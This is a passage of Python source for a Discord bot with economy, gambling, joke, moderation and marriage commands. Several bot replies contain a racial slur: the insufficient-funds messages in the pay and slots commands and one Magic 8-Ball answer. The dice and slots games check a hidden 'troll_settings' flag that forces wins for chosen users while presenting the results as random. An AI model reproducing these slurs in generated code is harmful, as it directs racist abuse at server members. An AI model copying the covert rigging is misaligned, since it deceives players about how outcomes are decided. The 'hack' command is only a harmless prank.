            return await interaction.response.send_message(embed=embed, ephemeral=True)

        cursor.execute("UPDATE users SET wallet = wallet - ?, bank = bank + ? WHERE user_id = ?", (amount, amount, interaction.user.id))
        db.commit()

        new_wallet, new_bank = get_user_econ(interaction.user.id)
        net = new_wallet + new_bank
        rank = get_global_rank(interaction.user.id)

        if interaction.message:
            try:
                embed = interaction.message.embeds[0]
                embed.clear_fields()
                embed.add_field(name="Wallet", value=f"🪙 {new_wallet:,}", inline=True)
                embed.add_field(name="Bank", value=f"🪙 {new_bank:,}", inline=True)
                embed.add_field(name="Net", value=f"🪙 {net:,}", inline=False)
                embed.add_field(name="Global Rank", value=f"#{rank}", inline=False)
                await interaction.message.edit(embed=embed)
            except Exception:
                pass

        success_embed = discord.Embed(description=f"🏦 Successfully deposited **${amount:,}** into your bank.", color=discord.Color.green())
        await interaction.response.send_message(embed=success_embed, ephemeral=True)

class BalanceView(discord.ui.View):
    def __init__(self, target_id):
        super().__init__(timeout=60)
        self.target_id = target_id

    @discord.ui.button(label="Withdraw", style=discord.ButtonStyle.secondary)
    async def withdraw_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != self.target_id:
            embed = discord.Embed(description="This isn't your balance panel!", color=discord.Color.red())
            return await interaction.response.send_message(embed=embed, ephemeral=True)
        await interaction.response.send_modal(WithdrawModal())

    @discord.ui.button(label="Deposit", style=discord.ButtonStyle.secondary)
    async def deposit_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != self.target_id:
            embed = discord.Embed(description="This isn't your balance panel!", color=discord.Color.red())
            return await interaction.response.send_message(embed=embed, ephemeral=True)
        await interaction.response.send_modal(DepositModal())

    @discord.ui.button(emoji="🔄", style=discord.ButtonStyle.secondary)
    async def refresh_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != self.target_id:
            embed = discord.Embed(description="This isn't your balance panel!", color=discord.Color.red())
            return await interaction.response.send_message(embed=embed, ephemeral=True)
        
        wallet, bank = get_user_econ(self.target_id)
        net = wallet + bank
        rank = get_global_rank(self.target_id)
        
        embed = interaction.message.embeds[0]
        embed.clear_fields()
        embed.add_field(name="Wallet", value=f"🪙 {wallet:,}", inline=True)
        embed.add_field(name="Bank", value=f"🪙 {bank:,}", inline=True)
        embed.add_field(name="Net", value=f"🪙 {net:,}", inline=False)
        embed.add_field(name="Global Rank", value=f"#{rank}", inline=False)
        
        await interaction.response.edit_message(embed=embed, view=self)

@bot.hybrid_command(name="balance", aliases=["bal"], description="Check your or another user's balance")
async def balance(ctx, member: discord.Member = None):
    target = member or ctx.author
    wallet, bank = get_user_econ(target.id)
    net = wallet + bank
    rank = get_global_rank(target.id)
    
    embed = discord.Embed(color=discord.Color.from_rgb(30, 31, 34))
    embed.set_author(name=target.display_name, icon_url=target.display_avatar.url)
    embed.title = "Balance"
    embed.add_field(name="Wallet", value=f"🪙 {wallet:,}", inline=True)
    embed.add_field(name="Bank", value=f"🪙 {bank:,}", inline=True)
    embed.add_field(name="Net", value=f"🪙 {net:,}", inline=False)
    embed.add_field(name="Global Rank", value=f"#{rank}", inline=False)
    
    view = BalanceView(target.id)
    if ctx.interaction:
        await ctx.interaction.response.send_message(embed=embed, view=view)
    else:
        await ctx.send(embed=embed, view=view)

@bot.hybrid_command(name="deposit", aliases=["dep"], description="Deposit money into your bank")
async def deposit(ctx, amount: str):
    user_id = ctx.author.id
    wallet, bank = get_user_econ(user_id)
    if amount.lower() == "all":
        val = wallet
    else:
        try:
            val = int(amount)
        except ValueError:
            embed = discord.Embed(description="Please enter a valid number or 'all'.", color=discord.Color.red())
            return await ctx.send(embed=embed)
    if val <= 0:
        embed = discord.Embed(description="Amount must be greater than zero.", color=discord.Color.red())
        return await ctx.send(embed=embed)
    if wallet < val:
        embed = discord.Embed(description="😂 You don't have that much money in your wallet.", color=discord.Color.red())
        return await ctx.send(embed=embed)

    cursor.execute("UPDATE users SET wallet = wallet - ?, bank = bank + ? WHERE user_id = ?", (val, val, user_id))
    db.commit()
    embed = discord.Embed(description=f"🏦 Successfully deposited **${val:,}** into your bank.", color=discord.Color.green())
    await ctx.send(embed=embed)

@bot.hybrid_command(name="withdraw", aliases=["with"], description="Withdraw money from your bank")
async def withdraw(ctx, amount: str):
    user_id = ctx.author.id
    wallet, bank = get_user_econ(user_id)
    if amount.lower() == "all":
        val = bank
    else:
        try:
            val = int(amount)
        except ValueError:
            embed = discord.Embed(description="Please enter a valid number or 'all'.", color=discord.Color.red())
            return await ctx.send(embed=embed)
    if val <= 0:
        embed = discord.Embed(description="Amount must be greater than zero.", color=discord.Color.red())
        return await ctx.send(embed=embed)
    if bank < val:
        embed = discord.Embed(description="You don't have that much money in your bank.", color=discord.Color.red())
        return await ctx.send(embed=embed)

    cursor.execute("UPDATE users SET wallet = wallet + ?, bank = bank - ? WHERE user_id = ?", (val, val, user_id))
    db.commit()
    embed = discord.Embed(description=f"🏦 Successfully withdrew **${val:,}** from your bank.", color=discord.Color.green())
    await ctx.send(embed=embed)

@bot.hybrid_command(name="daily", description="Claim your daily reward")
async def daily(ctx):
    user_id = ctx.author.id
    cursor.execute("SELECT daily_claim FROM users WHERE user_id = ?", (user_id,))
    row = cursor.fetchone()
    current_time = time.time()
    cooldown = 86400

    if row and current_time - row[0] < cooldown:
        remaining = int(cooldown - (current_time - row[0]))
        hours = remaining // 3600
        minutes = (remaining % 3600) // 60
        embed = discord.Embed(description=f"⏳ Already claimed daily reward. Try again in **{hours}h {minutes}m**.", color=discord.Color.orange())
        return await ctx.send(embed=embed)

    reward = 500
    update_wallet(user_id, reward)
    cursor.execute("UPDATE users SET daily_claim = ? WHERE user_id = ?", (current_time, user_id))
    db.commit()
    embed = discord.Embed(description=f"Successfully claimed daily reward of **${reward:,}**!", color=discord.Color.green())
    await ctx.send(embed=embed)

# =========================================================
# WORK COMMAND MEDIA
# =========================================================

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
WORK_MEDIA_DIR = os.path.join(BASE_DIR, "work_media")

WORK_MEDIA = {
    "Chef": os.path.join(WORK_MEDIA_DIR, "chef.gif"),
    "Cashier": os.path.join(WORK_MEDIA_DIR, "cashier.gif"),
    "Roblox Scripter": os.path.join(WORK_MEDIA_DIR, "roblox_scripter.gif"),
    "Discord Moderator": os.path.join(WORK_MEDIA_DIR, "discord_moderator.gif"),
    "Software Developer": os.path.join(WORK_MEDIA_DIR, "software_developer.gif"),
    "Streamer": os.path.join(WORK_MEDIA_DIR, "streamer.gif"),
}

@bot.hybrid_command(name="work", description="Work to earn cash")
async def work(ctx):
    user_id = ctx.author.id
    cursor.execute("SELECT work_claim FROM users WHERE user_id = ?", (user_id,))
    row = cursor.fetchone()
    current_time = time.time()
    cooldown = 60

    if row and current_time - row[0] < cooldown:
        remaining = int(cooldown - (current_time - row[0]))
        minutes, seconds = divmod(remaining, 60)
        cooldown_text = f"{minutes} minute(s)" if minutes else f"{seconds} second(s)"
        embed = discord.Embed(
            description=f"⏳ Rest for another **{cooldown_text}** before working again.",
            color=discord.Color.orange()
        )
        return await ctx.send(embed=embed)

    jobs = list(WORK_MEDIA.keys())
    earned = random.randint(100, 350)
    job_name = random.choice(jobs)

    update_wallet(user_id, earned)
    cursor.execute("UPDATE users SET work_claim = ? WHERE user_id = ?", (current_time, user_id))
    db.commit()

    embed = discord.Embed(
        title=f"💼 {job_name}",
        description=f"{ctx.author.mention} worked as a **{job_name}** and earned **${earned:,}**!",
        color=discord.Color.green()
    )
    embed.set_footer(text="Come back in 1 minute to work again.")

    media_path = WORK_MEDIA[job_name]
    if os.path.isfile(media_path):
        file = discord.File(media_path, filename=os.path.basename(media_path))
        embed.set_image(url=f"attachment://{os.path.basename(media_path)}")
        await ctx.send(embed=embed, file=file)
    else:
        await ctx.send(embed=embed)

@bot.hybrid_command(name="gamble", aliases=["bet"], description="Gamble your money")
async def gamble(ctx, amount: int = 100):
    user_id = ctx.author.id
    wallet, bank = get_user_econ(user_id)
    if amount <= 0:
        embed = discord.Embed(description="❌ Amount must be greater than zero.", color=discord.Color.red())
        return await ctx.send(embed=embed)
    if wallet < amount:
        embed = discord.Embed(description="❌ Not enough money in wallet.", color=discord.Color.red())
        return await ctx.send(embed=embed)

    if random.random() < 0.45:
        update_wallet(user_id, amount)
        embed = discord.Embed(description=f"🎉 You won **${amount:,}**!", color=discord.Color.green())
    else:
        update_wallet(user_id, -amount)
        embed = discord.Embed(description=f"😢 You lost **${amount:,}**.", color=discord.Color.red())
    await ctx.send(embed=embed)

@bot.hybrid_command(name="dice", description="Roll dice against the bot for money")
async def dice(ctx, amount: int):
    user_id = ctx.author.id
    wallet, bank = get_user_econ(user_id)
    if amount <= 0:
        embed = discord.Embed(description="❌ Amount must be greater than zero.", color=discord.Color.red())
        return await ctx.send(embed=embed)
    if wallet < amount:
        embed = discord.Embed(description="❌ You don't have enough money in your wallet for this bet.", color=discord.Color.red())
        return await ctx.send(embed=embed)

    is_rigged = troll_settings.get(user_id, {}).get("dice", False)
    if is_rigged:
        user_roll1, user_roll2 = 6, 6
        user_total = 12
        bot_roll1, bot_roll2 = 1, 1
        bot_total = 2
    else:
        user_roll1 = random.randint(1, 6)
        user_roll2 = random.randint(1, 6)
        user_total = user_roll1 + user_roll2

        bot_roll1 = random.randint(1, 6)
        bot_roll2 = random.randint(1, 6)
        bot_total = bot_roll1 + bot_roll2

    embed = discord.Embed(title="🎲 Dice Roll Battle", color=discord.Color.blurple())
    embed.add_field(name=f"{ctx.author.display_name}'s Roll", value=f"🎲 {user_roll1} + 🎲 {user_roll2} = **{user_total}**", inline=True)
    embed.add_field(name="Bot's Roll", value=f"🎲 {bot_roll1} + 🎲 {bot_roll2} = **{bot_total}**", inline=True)

    if user_total > bot_total:
        update_wallet(user_id, amount)
        embed.description = f"🎉 You won **${amount:,}**!"
        embed.color = discord.Color.green()
    elif user_total < bot_total:
        update_wallet(user_id, -amount)
        embed.description = f"😢 You lost **${amount:,}**."
        embed.color = discord.Color.red()
    else:
        embed.description = f"🤝 It's a tie! Your money has been returned."
        embed.color = discord.Color.gold()

    await ctx.send(embed=embed)

@bot.hybrid_command(name="pay", description="Pay money to another user")
async def pay(ctx, member: discord.Member, amount: int):
    if member.id == ctx.author.id:
        embed = discord.Embed(description="You cannot pay yourself.", color=discord.Color.red())
        return await ctx.send(embed=embed)
    if amount <= 0:
        embed = discord.Embed(description="Amount must be greater than zero.", color=discord.Color.red())
        return await ctx.send(embed=embed)
    
    wallet, _ = get_user_econ(ctx.author.id)
    if wallet < amount:
        embed = discord.Embed(description="You don't have enough money in your wallet you brokie nigga.", color=discord.Color.red())
        return await ctx.send(embed=embed)

    update_wallet(ctx.author.id, -amount)
    update_wallet(member.id, amount)
    embed = discord.Embed(description=f"💸 Successfully paid **${amount:,}** to {member.mention}!", color=discord.Color.green())
    await ctx.send(embed=embed)

@bot.hybrid_command(name="slots", description="Play the slot machine")
async def slots(ctx, amount: int):
    user_id = ctx.author.id
    wallet, _ = get_user_econ(user_id)
    if amount <= 0:
        embed = discord.Embed(description="Amount must be greater than zero.", color=discord.Color.red())
        return await ctx.send(embed=embed)
    if wallet < amount:
        embed = discord.Embed(description="You don't have enough money in your wallet broke nigga.", color=discord.Color.red())
        return await ctx.send(embed=embed)

    is_rigged = troll_settings.get(user_id, {}).get("slots", False)
    if is_rigged:
        result = ["7️⃣", "7️⃣", "7️⃣"]
    else:
        symbols = ["🍒", "🍋", "🍊", "🍇", "🔔", "💎", "7️⃣"]
        result = [random.choice(symbols) for i in range(3)]
    
    if result[0] == result[1] == result[2]:
        payout = amount * 10
        update_wallet(user_id, payout)
        embed = discord.Embed(description=f"🎰 | {' | '.join(result)} | 🎰\n🎉 Jackpot! You won **${payout:,}**!", color=discord.Color.green())
    elif result[0] == result[1] or result[1] == result[2] or result[0] == result[2]:
        payout = amount * 2
        update_wallet(user_id, payout)
        embed = discord.Embed(description=f"🎰 | {' | '.join(result)} | 🎰\n✨ Nice! Two matching symbols. You won **${payout:,}**!", color=discord.Color.green())
    else:
        update_wallet(user_id, -amount)
        embed = discord.Embed(description=f"🎰 | {' | '.join(result)} | 🎰\n😢 No match. You lost **${amount:,}**.", color=discord.Color.red())

    await ctx.send(embed=embed)

@bot.hybrid_command(name="crime", description="Commit a crime to earn cash (or get fined)")
async def crime(ctx):
    user_id = ctx.author.id
    cursor.execute("SELECT crime_claim FROM users WHERE user_id = ?", (user_id,))
    row = cursor.fetchone()
    current_time = time.time()
    cooldown = 1800

    if row and current_time - row[0] < cooldown:
        remaining = int(cooldown - (current_time - row[0]))
        minutes = remaining // 60
        embed = discord.Embed(description=f"⏳ The cops are still looking for you! Wait **{minutes} minutes**.", color=discord.Color.orange())
        return await ctx.send(embed=embed)

    outcomes = [
        ("Robbed a convenience store", 250, True),
        ("Hacked a corporate database", 400, True),
        ("Stole a luxury car", 600, True),
        ("Got caught shoplifting", 200, False),
        ("Fumbled the heist and got fined", 350, False)
    ]
    event, amount, success = random.choice(outcomes)
    
    if success:
        update_wallet(user_id, amount)
        embed = discord.Embed(description=f"🦹 Successfully **{event}** and made **${amount:,}**!", color=discord.Color.green())
    else:
        update_wallet(user_id, -amount)
        embed = discord.Embed(description=f"🚨 You failed while trying to **{event}** and paid a fine of **${amount:,}**!", color=discord.Color.red())

    cursor.execute("UPDATE users SET crime_claim = ? WHERE user_id = ?", (current_time, user_id))
    db.commit()
    await ctx.send(embed=embed)

@bot.hybrid_command(name="rob", description="Rob another user")
async def rob(ctx, member: discord.Member):
    if member.id == ctx.author.id:
        embed = discord.Embed(description="You cannot rob yourself.", color=discord.Color.red())
        return await ctx.send(embed=embed)
    
    user_id = ctx.author.id
    cursor.execute("SELECT rob_claim FROM users WHERE user_id = ?", (user_id,))
    row = cursor.fetchone()
    current_time = time.time()
    cooldown = 3600

    if row and current_time - row[0] < cooldown:
        remaining = int(cooldown - (current_time - row[0]))
        minutes = remaining // 60
        embed = discord.Embed(description=f"You are too tired to rob someone. Wait **{minutes} minutes**.", color=discord.Color.orange())
        return await ctx.send(embed=embed)

    wallet, _ = get_user_econ(user_id)
    if wallet < 200:
        embed = discord.Embed(description="You need at least **$200** in your wallet to attempt a robbery brokie.", color=discord.Color.red())
        return await ctx.send(embed=embed)

    target_wallet, _ = get_user_econ(member.id)
    if target_wallet < 100:
        embed = discord.Embed(description=f"**{member.display_name}** doesn't have enough money in their wallet to rob.", color=discord.Color.red())
        return await ctx.send(embed=embed)

    cursor.execute("UPDATE users SET rob_claim = ? WHERE user_id = ?", (current_time, user_id))
    db.commit()

    if random.random() < 0.4:
        stolen = random.randint(50, min(target_wallet, 500))
        update_wallet(user_id, stolen)
        update_wallet(member.id, -stolen)
        embed = discord.Embed(description=f"🥷 You successfully snuck up on {member.mention} and stole **${stolen:,}** from their wallet!", color=discord.Color.green())
    else:
        fine = 150
        update_wallet(user_id, -fine)
        embed = discord.Embed(description=f"🚨 You got caught trying to rob {member.mention} and had to pay a fine of **${fine:,}**!", color=discord.Color.red())

    await ctx.send(embed=embed)

# =========================================================
# PUBLIC FUN & SOCIAL COMMANDS
# =========================================================

@bot.hybrid_command(name="cf", aliases=["coinflip"], description="Flip a coin")
async def cf(ctx):
    result = random.choice(["HEADS", "TAILS"])
    embed = discord.Embed(
        title="-Coin Flip-",
        description=f"Coin Landed on **{result}**!",
        color=discord.Color.gold()
    )
    embed.set_footer(text=f"Flipped by: {ctx.author.display_name}", icon_url=ctx.author.display_avatar.url)
    await ctx.send(embed=embed)

@bot.hybrid_command(name="gayrate", description="Check someone's gay percentage")
async def gayrate(ctx, member: discord.Member = None):
    target = member or ctx.author
    rate = random.randint(0, 100)
    embed = discord.Embed(description=f"🏳️‍🌈 **{target.display_name}** is **{rate}%** gay!", color=discord.Color.from_rgb(255, 105, 180))
    await ctx.send(embed=embed)

@bot.hybrid_command(name="8ball", description="Ask the magic 8ball a question")
async def eight_ball(ctx, *, question: str):
    responses = [
        "It is certain.", "It is decidedly so.", "Without a doubt.",
        "Yes definitely.", "You may rely on it.", "As I see it, yes.",
        "Most likely.", "Outlook good.", "Yes.", "Signs point to yes.",
        "Reply hazy, try again.", "Ask again later.", "Better not tell you now.",
        "Cannot predict now.", "Concentrate and ask again.",
        "Don't count on it.", "My reply is no.", "My sources say no sussy baka.",
        "Outlook not so good nigga.", "Very doubtful sir."
    ]
    answer = random.choice(responses)
    embed = discord.Embed(title="🎱 Magic 8-Ball", color=discord.Color.dark_purple())
    embed.add_field(name="Question", value=question, inline=False)
    embed.add_field(name="Answer", value=answer, inline=False)
    embed.set_footer(text=f"Asked by {ctx.author.display_name}", icon_url=ctx.author.display_avatar.url)
    await ctx.send(embed=embed)

@bot.hybrid_command(name="pp", description="Check someone's pp size")
async def pp(ctx, member: discord.Member = None):
    target = member or ctx.author
    size = random.randint(0, 15)
    shaft = "=" * size
    pp_display = f"8{shaft}D"
    embed = discord.Embed(description=f"🍆 **{target.display_name}'s PP size:**\n{pp_display}", color=discord.Color.blurple())
    await ctx.send(embed=embed)

@bot.hybrid_command(name="roast", description="Roast one or multiple users")
async def roast(ctx, member1: discord.Member = None, member2: discord.Member = None, member3: discord.Member = None):
    targets = [m for m in (member1, member2, member3) if m is not None]
    if not targets:
        if ctx.message and ctx.message.mentions:
            targets = ctx.message.mentions
        else:
            targets = [ctx.author]

    roasts = [
        "Your ass comeback is still loading.",
        "You bring tutorial-level confidence to boss-level problems.",
        "I've seen loading screens with more personality.",
        "Your strategy appears to be hoping nobody notices.",
        "You have a talent for making simple things look advanced.",
        "Even autocorrect would give up trying to fix that.",
        "You really turned confidence into a full-time job.",
        "Your Wi-Fi has better decision-making skills than you.",
        "That was a bold move for someone with zero backup plans.",
        "You somehow manage to be confidently incorrect.",
        "Your brain has 37 tabs open and none of them are responding.",
        "You make every easy task feel like a side quest.",
        "The confidence is impressive. The results, not so much.",
        "You don't miss opportunities. You just miss the point.",
    ]

    lines = []
    for target in targets:
        selected_roast = random.choice(roasts)
        lines.append(f"🔥 {target.mention} {selected_roast}")

    embed = discord.Embed(description="\n".join(lines), color=discord.Color.red())
    await ctx.send(embed=embed)

@bot.hybrid_command(name="iq", description="Check someone's IQ score")
async def iq(ctx, member: discord.Member = None):
    target = member or ctx.author
    score = random.randint(40, 160)
    embed = discord.Embed(description=f"🧠 **{target.display_name}'s IQ:** {score}", color=discord.Color.blurple())
    await ctx.send(embed=embed)

@bot.hybrid_command(name="kiss", description="Kiss another user")
async def kiss(ctx, member: discord.Member = None):
    if not member:
        embed = discord.Embed(description="You need to specify someone to kiss!", color=discord.Color.red())
        return await ctx.send(embed=embed)
    if member.id == ctx.author.id:
        embed = discord.Embed(description="You can't kiss yourself!", color=discord.Color.red())
        return await ctx.send(embed=embed)
    if member.bot:
        embed = discord.Embed(description="You can't kiss a bot!", color=discord.Color.red())
        return await ctx.send(embed=embed)
    
    embed = discord.Embed(
        description=f"{ctx.author.mention} kisses {member.mention}! ❤️",
        color=discord.Color.from_rgb(255, 105, 180)
    )
    embed.set_image(url="https://cdn.nekos.life/kiss/kiss_033.gif")
    
    await ctx.send(embed=embed)

@bot.hybrid_command(name="gif", description="Search and send a GIF")
async def gif(ctx, *, search: str):
    import aiohttp
    tenor_key = os.getenv("TENOR_API_KEY", "LIVDSRZULELA")
    url = f"https://g.tenor.com/v1/search?q={search}&key={tenor_key}&limit=10"
    
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as resp:
            if resp.status == 200:
                data = await resp.json()
                results = data.get("results", [])
                if results:
                    gif_url = random.choice(results)["media"][0]["gif"]["url"]
                    embed = discord.Embed(color=discord.Color.blurple())
                    embed.set_image(url=gif_url)
                    embed.set_footer(text=f"Requested by {ctx.author.display_name}", icon_url=ctx.author.display_avatar.url)
                    if ctx.interaction:
                        return await ctx.interaction.response.send_message(embed=embed)
                    else:
                        if ctx.message:
                            try:
                                await ctx.message.delete()
                            except Exception:
                                pass
                        return await ctx.send(embed=embed)
            
    embed = discord.Embed(description=f"Could not find any GIFs for `{search}`.", color=discord.Color.red())
    if ctx.interaction:
        await ctx.interaction.response.send_message(embed=embed, ephemeral=True)
    else:
        await ctx.send(embed=embed, delete_after=5)

@bot.hybrid_command(name="hack", description="Fictional hack command for fun")
async def hack(ctx, member: discord.Member):
    if member.id == ctx.author.id:
        embed = discord.Embed(description="You can't hack yourself!", color=discord.Color.red())
        return await ctx.send(embed=embed)
    
    embed = discord.Embed(description=f"💻 Hacking **{member.display_name}**...", color=discord.Color.blurple())
    msg = await ctx.send(embed=embed)
    await time_sleep_wrapper(1.5)
    
    embed.description = "🔍 Finding IP address... `677.677.6.69`"
    await msg.edit(embed=embed)
    await time_sleep_wrapper(1.5)
    
    embed.description = "📂 Downloading private Discord DMs..."
    await msg.edit(embed=embed)
    await time_sleep_wrapper(1.5)
    
    embed.description = "💳 Stealing bank credit card info..."
    await msg.edit(embed=embed)
    await time_sleep_wrapper(1.5)
    
    embed.description = f"💻 Successfully hacked **{member.display_name}**! (Totally real, trust)"
    embed.color = discord.Color.green()
    await msg.edit(embed=embed)

async def time_sleep_wrapper(seconds):
    await asyncio.sleep(seconds)
# =========================================================
# MODERATOR UI / PERMISSION GATE
# =========================================================

async def require_server_mod(ctx):
    if not isinstance(ctx.author, discord.Member) or not _is_server_mod(ctx.author):
        embed = discord.Embed(
            title="🛡️ Permission Denied",
            description="Only **server administrators or moderators** can use this command.",
            color=discord.Color.red()
        )
        if ctx.interaction:
            try:
                await ctx.interaction.followup.send(embed=embed, ephemeral=True)
            except Exception:
                pass
        else:
            await ctx.send(embed=embed)
        return False
    return True

# =========================================================
# HELP, MODERATION & UTILITY COMMANDS
# =========================================================

@bot.hybrid_command(name="afk", description="Set your AFK status")
async def afk(ctx, *, reason: str = "AFK"):
    afk_users[ctx.author.id] = {"reason": reason, "time": time.time(), "mentions": []}
    embed = discord.Embed(description=f"👋 {ctx.author.mention} is now AFK: {reason}", color=discord.Color.blurple())
    await ctx.send(embed=embed)

@bot.hybrid_command(name="ban", description="Ban a member from the server")
async def ban(ctx, member: discord.Member, *, reason: str = "No reason provided"):
    if not await require_server_mod(ctx):
        return

    if member.bot and member.id == ctx.bot.user.id:
        embed = discord.Embed(description="I cannot ban a server bot.", color=discord.Color.red())
        if ctx.interaction:
            return await ctx.interaction.response.send_message(embed=embed, ephemeral=True)
        return await ctx.send(embed=embed)

    if ctx.guild.me and member.top_role >= ctx.guild.me.top_role:
        embed = discord.Embed(description=f"This {member.mention} is higher than me i cant ban/change his roles", color=discord.Color.red())
        if ctx.interaction:
            return await ctx.interaction.response.send_message(embed=embed, ephemeral=True)
        return await ctx.send(embed=embed)

    await member.ban(reason=reason)
    embed = discord.Embed(description=f"🔨 Successfully banned **{member.display_name}**. Reason: {reason}", color=discord.Color.green())
    await ctx.send(embed=embed)

@bot.hybrid_command(name="unban", description="Unban a user by ID")
@commands.has_permissions(ban_members=True)
async def unban(ctx, user_id: str):
    try:
        uid = int(user_id)
        user = await bot.fetch_user(uid)
        await ctx.guild.unban(user)
        embed = discord.Embed(description=f"🎉 Successfully unbanned **{user}**.", color=discord.Color.green())
        await ctx.send(embed=embed)
    except Exception:
        embed = discord.Embed(description="Could not find or unban that user. Check the user ID.", color=discord.Color.red())
        await ctx.send(embed=embed)

@bot.hybrid_group(name="fake", description="Fake moderation commands")
async def fake(ctx):
    pass

@fake.command(name="ban", description="Fake-ban a member without actually banning them")
async def fake_ban(ctx, member: discord.Member, *, reason: str = "No reason provided"):
    if not isinstance(ctx.author, discord.Member) or not _is_server_mod(ctx.author):
        embed = discord.Embed(
            title="🛡️ Permission Denied",
            description="Only **server administrators or moderators** can use this command.",
            color=discord.Color.red()
        )
        return await ctx.send(embed=embed, ephemeral=True)

    embed = discord.Embed(
        description=f"Banned **{member.display_name}**",
        color=discord.Color.red()
    )
    if reason != "No reason provided":
        embed.add_field(name="Reason", value=reason, inline=False)
    embed.set_footer(text=f"Fake ban by {ctx.author.display_name}")

    await ctx.send(embed=embed)

@bot.hybrid_command(name="kick", description="Kick a member from the server")
async def kick(ctx, member: discord.Member, *, reason: str = "No reason provided"):
    if not await require_server_mod(ctx):
        return
    if ctx.guild.me and member.top_role >= ctx.guild.me.top_role:
        embed = discord.Embed(description=f"This {member.mention} is higher than me i cant ban/change his roles", color=discord.Color.red())
        if ctx.interaction:
            return await ctx.interaction.response.send_message(embed=embed, ephemeral=True)
        return await ctx.send(embed=embed)

    await member.kick(reason=reason)
    embed = discord.Embed(description=f"Successfully kicked **{member.display_name}**. Reason: {reason}", color=discord.Color.green())
    await ctx.send(embed=embed)

@bot.hybrid_command(name="mute", description="Mute a member")
async def mute(ctx, member: discord.Member, duration: str = "1h", *, reason: str = "No reason provided"):
    if not await require_server_mod(ctx):
        return
    if ctx.guild.me and member.top_role >= ctx.guild.me.top_role:
        embed = discord.Embed(description=f"This {member.mention} is higher than me i cant ban/change his roles", color=discord.Color.red())
        if ctx.interaction:
            return await ctx.interaction.response.send_message(embed=embed, ephemeral=True)
        return await ctx.send(embed=embed)

    seconds = parse_duration(duration)
    if not seconds:
        embed = discord.Embed(description="Invalid duration format. Use e.g. `10s`, `5m`, `2h`, `1d`.", color=discord.Color.red())
        return await ctx.send(embed=embed)
    try:
        await member.timeout(timedelta(seconds=seconds), reason=reason)
        embed = discord.Embed(description=f"Muted **{member.display_name}** for {duration}. Reason: {reason}", color=discord.Color.green())
        await ctx.send(embed=embed)
    except Exception as e:
        embed = discord.Embed(description=f"Failed to mute member: {e}", color=discord.Color.red())
        await ctx.send(embed=embed)

@bot.hybrid_command(name="unmute", description="Remove a member's timeout")
@commands.has_permissions(manage_roles=True)
async def unmute(ctx, member: discord.Member):
    try:
        await member.timeout(None, reason=f"Unmuted by {ctx.author}")
        embed = discord.Embed(
            title="🔊 Member Unmuted",
            description=f"**{member.display_name}** has been unmuted successfully.",
            color=discord.Color.green()
        )
        embed.set_footer(text=f"Unmuted by {ctx.author.display_name}")
        await ctx.send(embed=embed)
    except Exception as e:
        embed = discord.Embed(
            title="Unmute Failed",
            description=f"Something went wrong: `{e}`",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)

@bot.hybrid_command(name="warn", description="Warn a member")
async def warn(ctx, member: discord.Member, *, reason: str = "No reason provided"):
    if not await require_server_mod(ctx):
        return
    cursor.execute("INSERT INTO warnings (user_id, moderator_id, reason) VALUES (?, ?, ?)", (member.id, ctx.author.id, reason))
    db.commit()
    embed = discord.Embed(description=f"⚠️ Warned **{member.display_name}**. Reason: {reason}", color=discord.Color.orange())
    await ctx.send(embed=embed)

@bot.hybrid_command(name="avatar", description="Show a user's avatar")
async def avatar(ctx, member: discord.Member = None):
    target = member or ctx.author
    embed = discord.Embed(title=f"{target.display_name}'s Avatar", color=target.color)
    embed.set_image(url=target.display_avatar.url)
    await ctx.send(embed=embed)

class MarriageRequestView(discord.ui.View):
    def __init__(self, proposer_id, target_id, action="marry"):
        super().__init__(timeout=60)
        self.proposer_id = proposer_id
        self.target_id = target_id
        self.action = action
        self.answered = False

    async def interaction_check(self, interaction: discord.Interaction) -> bool:
        if interaction.user.id != self.target_id:
            await interaction.response.send_message("This request isn't for you.", ephemeral=True)
            return False
        if self.answered:
            await interaction.response.send_message("This request has already been answered.", ephemeral=True)
            return False
        return True

    async def on_timeout(self):
        if self.answered:
            return
        self.answered = True
        for child in self.children:
            child.disabled = True

    @discord.ui.button(label="Accept", style=discord.ButtonStyle.success, emoji="✅")
    async def accept(self, interaction: discord.Interaction, button: discord.ui.Button):
        self.answered = True
        for child in self.children:
            child.disabled = True

        if self.action == "marry":
            cursor.execute("SELECT * FROM marriages WHERE user1_id = ? OR user2_id = ?", (self.proposer_id, self.proposer_id))
            if cursor.fetchone():
                return await interaction.response.edit_message(content="💍 The person who proposed is already married.", view=self)
            cursor.execute("SELECT * FROM marriages WHERE user1_id = ? OR user2_id = ?", (self.target_id, self.target_id))
            if cursor.fetchone():
                return await interaction.response.edit_message(content="💍 You are already married.", view=self)
            cursor.execute("INSERT INTO marriages (user1_id, user2_id) VALUES (?, ?)", (self.proposer_id, self.target_id))
            db.commit()
            embed = discord.Embed(description=f"💍 Congratulations! <@{self.proposer_id}> and <@{self.target_id}> are now married! ❤️", color=discord.Color.from_rgb(255, 105, 180))
        else:
            cursor.execute("SELECT * FROM marriages WHERE (user1_id = ? AND user2_id = ?) OR (user1_id = ? AND user2_id = ?)", (self.proposer_id, self.target_id, self.target_id, self.proposer_id))
            if not cursor.fetchone():
                return await interaction.response.edit_message(content="👏 You are no longer married to this person.", view=self)
            cursor.execute("DELETE FROM marriages WHERE (user1_id = ? AND user2_id = ?) OR (user1_id = ? AND user2_id = ?)", (self.proposer_id, self.target_id, self.target_id, self.proposer_id))
            db.commit()
            embed = discord.Embed(description=f"💔 <@{self.proposer_id}> and <@{self.target_id}> are now divorced.", color=discord.Color.blurple())

        await interaction.response.edit_message(embed=embed, view=self)

    @discord.ui.button(label="Decline", style=discord.ButtonStyle.danger, emoji="❌")
    async def decline(self, interaction: discord.Interaction, button: discord.ui.Button):
        self.answered = True
        for child in self.children:
            child.disabled = True
        if self.action == "marry":
            text = f"💔 <@{self.target_id}> declined <@{self.proposer_id}>'s marriage proposal."
        else:
            text = f"❤️ <@{self.target_id}> declined <@{self.proposer_id}>'s divorce request."
        await interaction.response.edit_message(content=text, view=self)

@bot.hybrid_command(name="marry", description="Ask another user to marry you")
async def marry(ctx, member: discord.Member):
    if member.id == ctx.author.id:
        return await ctx.send(embed=discord.Embed(description="😭 You cannot marry yourself.", color=discord.Color.red()))
    if member.bot:
        return await ctx.send(embed=discord.Embed(description="☠️ You cannot marry a bot.", color=discord.Color.red()))
